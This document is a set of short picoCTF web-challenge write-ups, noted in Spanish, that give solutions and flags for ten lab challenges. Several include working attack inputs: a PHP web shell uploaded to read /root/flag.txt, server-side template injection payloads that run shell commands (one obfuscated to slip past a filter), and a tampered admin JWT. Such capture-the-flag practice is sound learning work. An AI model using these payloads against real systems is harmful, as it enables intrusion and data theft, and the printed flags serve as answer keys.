# 01 Bookmarklet
# DESC
Why search for the flag when I can make a bookmarklet to print it for me?Browse [here](http://titan.picoctf.net:61827/), and find the flag!

# SOLUCION

````` python
abri la pagina  

copie este codigo 
        javascript:(function() {
            var encryptedFlag = "àÒÆÞ¦È¬ëÙ£Ö�ÓÚåÛÑ¢ÕÓ�Ó�Ç¡�¥Ìí";
            var key = "picoctf";
            var decryptedFlag = "";
            for (var i = 0; i < encryptedFlag.length; i++) {
                decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
            }
            alert(decryptedFlag);
        })();

le di en inspecionar y listo
picoCTF{p@g3_turn3r_0c0d211f}
````` 






# 02  Cookie Monster Secret Recipe
# DESC
Cookie Monster has hidden his top-secret cookie recipe somewhere on his website. As an aspiring cookie detective, your mission is to uncover this delectable secret. Can you outsmart Cookie Monster and find the hidden recipe?You can access the Cookie Monster [here](http://verbal-sleep.picoctf.net:54630/) and good luck


# SOLUCION

````` python
abri la pagina 
le di en inpeccionar ,me fui a Aplicacion 
copie la cookie 
la decodifique con base64 decode y listo 
picoCTF{c00k1e_m0nster_l0ves_c00kies_E634DFBB}
````` 






# 03  head-dump
# DESC
Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.The website is running [picoCTF News](http://verbal-sleep.picoctf.net:62122/).

# SOLUCION

````` python
abri la pagina 
me fui a la parte de http://verbal-sleep.picoctf.net:62122/api-docs/
descarge el archivo y filtre por pico
picoCTF{Pat!3nt_15_Th3_K3y_f1179e46}
````` 



# 04 n0s4n1ty 1
# DESC

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.You can access the web application [here](http://standard-pizzas.picoctf.net:57268/)!
# SOLUCION

````` python
me fu a la pagina carge un archivo .php que hice el cual contenia esto <?php system($_GET['mycommand']);  ?>
descpues camvie el url de la pagina por este http://standard-pizzas.picoctf.net:50745/uploads/shell.php?mycommand=sudo%20cat%20/root/flag.txt


y me dio la bandera 
picoCTF{wh47_c4n_u_d0_wPHP_b42a374d}

````` 






# 05 SSTI1
# DESC
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:52337/)!

# SOLUCION

````` python
copie esto en la pagina 
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag ').read()}}
y me dio la bandera
 picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}

````` 






# 06  findme
# DESC
Help us test the form by submiting the username as `test` and password as `test!`

Additional details will be available after launching your challenge instance.

# SOLUCION

````` python
use el burpsuite para interceptar la respuesta despues ayye el id y lo decodifique

````` 



# 07 Java Code Analysis!?!
# DESC
BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/483/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:56626/).

# SOLUCION

````` python
camvie esta parte .eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUzNTYwOTAsImlhdCI6MTc0NDc1MTI5MCwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.PcJoCGp40kMLzVDeseoayoF747V6xQhZLaf45Hsgohgy
despues cambie el admin y el user 
le di a flag y me regreso la bandera
picoCTF{w34k_jwt_n0t_g00d_42f5774a}

````` 






# 08  SQL Direct
# DESC


Connect to this PostgreSQL server and find the flag!`psql -h saturn.picoctf.net -p 59985 -U postgres pico`Password is `postgres`
# SOLUCION

````` python
lixin@DELTUS:/mnt/c/Windows$ psql -h saturn.picoctf.net -p 59985 -U postgres pico
Command 'psql' not found, but can be installed with:
sudo apt install postgresql-client-common
lixin@DELTUS:/mnt/c/Windows$ sudo apt install postgresql-client-common
[sudo] password for lixin:
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  postgresql-client-common
0 upgraded, 1 newly installed, 0 to remove and 90 not upgraded.
Need to get 36.4 kB of archives.
After this operation, 134 kB of additional disk space will be used.
Get:1 http://archive.ubuntu.com/ubuntu noble-updates/main amd64 postgresql-client-common all 257build1.1 [36.4 kB]
Fetched 36.4 kB in 6s (5763 B/s)
Selecting previously unselected package postgresql-client-common.
(Reading database ... 49159 files and directories currently installed.)
Preparing to unpack .../postgresql-client-common_257build1.1_all.deb ...
Unpacking postgresql-client-common (257build1.1) ...
Setting up postgresql-client-common (257build1.1) ...
Processing triggers for man-db (2.12.0-4build2) ...
lixin@DELTUS:/mnt/c/Windows$ psql -h saturn.picoctf.net -p 59985 -U postgres pico
Error: You must install at least one postgresql-client-<version> package
lixin@DELTUS:/mnt/c/Windows$ sudo apt install postgresql-client
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libpq5 postgresql-client-16
Suggested packages:
  postgresql-16 postgresql-doc-16
The following NEW packages will be installed:
  libpq5 postgresql-client postgresql-client-16
0 upgraded, 3 newly installed, 0 to remove and 90 not upgraded.
Need to get 1446 kB of archives.
After this operation, 4806 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://archive.ubuntu.com/ubuntu noble-updates/main amd64 libpq5 amd64 16.8-0ubuntu0.24.04.1 [142 kB]
Get:2 http://archive.ubuntu.com/ubuntu noble-updates/main amd64 postgresql-client-16 amd64 16.8-0ubuntu0.24.04.1 [1292 kB]
Get:3 http://archive.ubuntu.com/ubuntu noble-updates/main amd64 postgresql-client all 16+257build1.1 [11.6 kB]
Fetched 1446 kB in 7s (194 kB/s)
Selecting previously unselected package libpq5:amd64.
(Reading database ... 49195 files and directories currently installed.)
Preparing to unpack .../libpq5_16.8-0ubuntu0.24.04.1_amd64.deb ...
Unpacking libpq5:amd64 (16.8-0ubuntu0.24.04.1) ...
Selecting previously unselected package postgresql-client-16.
Preparing to unpack .../postgresql-client-16_16.8-0ubuntu0.24.04.1_amd64.deb ...
Unpacking postgresql-client-16 (16.8-0ubuntu0.24.04.1) ...
Selecting previously unselected package postgresql-client.
Preparing to unpack .../postgresql-client_16+257build1.1_all.deb ...
Unpacking postgresql-client (16+257build1.1) ...
Setting up libpq5:amd64 (16.8-0ubuntu0.24.04.1) ...
Setting up postgresql-client-16 (16.8-0ubuntu0.24.04.1) ...
update-alternatives: using /usr/share/postgresql/16/man/man1/psql.1.gz to provide /usr/share/man/man1/psql.1.gz (psql.1.gz) in auto mode
Setting up postgresql-client (16+257build1.1) ...
Processing triggers for libc-bin (2.39-0ubuntu8.4) ...
lixin@DELTUS:/mnt/c/Windows$ psql -h saturn.picoctf.net -p 59985 -U postgres pico
Password for user postgres:
psql: error: connection to server at "saturn.picoctf.net" (13.59.203.175), port 59985 failed: FATAL:  password authentication failed for user "postgres"
lixin@DELTUS:/mnt/c/Windows$ psql -h saturn.picoctf.net -p 59985 -U postgres pico
Password for user postgres:
psql (16.8 (Ubuntu 16.8-0ubuntu0.24.04.1), server 15.2 (Debian 15.2-1.pgdg110+1))
Type "help" for help.

pico=# /h
pico-#
pico-# \c pico
psql (16.8 (Ubuntu 16.8-0ubuntu0.24.04.1), server 15.2 (Debian 15.2-1.pgdg110+1))
You are now connected to database "pico" as user "postgres".
pico-#
pico-# \dt
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)

pico-# SELECT flags
pico-# SELECT * FROM flags;
ERROR:  syntax error at or near "/"
LINE 1: /h
        ^
pico=# select * from flags
pico-# \dt
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)

pico-# select * from flags
pico-# SELECT * FROM flags;
ERROR:  syntax error at or near "select"
LINE 2: select * from flags
        ^
pico=# select * from flags<
pico-# ^C
pico=# SELECT * FROM flags;
 id | firstname | lastname  |                address
----+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF{L3arN_S0m3_5qL_t0d4Y_21c94904}
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia
(3 rows)
````` 






# 09  SSTI2
# DESC

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:51842/)!
# SOLUCION

````` python
entre a la pagina y copie esto 
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
picoCTF{sst1_f1lt3r_byp4ss_8b534b82}
````` 



# 10  WebSockFish
# DESC

Can you win in a convincing manner against this chess bot? He won't go easy on you!You can find the challenge [here](http://verbal-sleep.picoctf.net:57518/).

# SOLUCION

````` python
inpecione en terminal y mande mensajes 
typeof sendMessage

'function'
sendMessage("mate -1000000000000000000000000000000000000000000");

undefined
sendMessage("mate -10000000000000000000000000000000000000000000000000000");

undefined
sendMessage("mate -10000000000000000000000000000000000000000000000000000000");

undefined
sendMessage("eval -100000000000000000000000000000000000000000000000000000000000000000000");

undefined
Huh???? How can I be losing this badly... I resign... here's your flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_c0789e29}
````` 






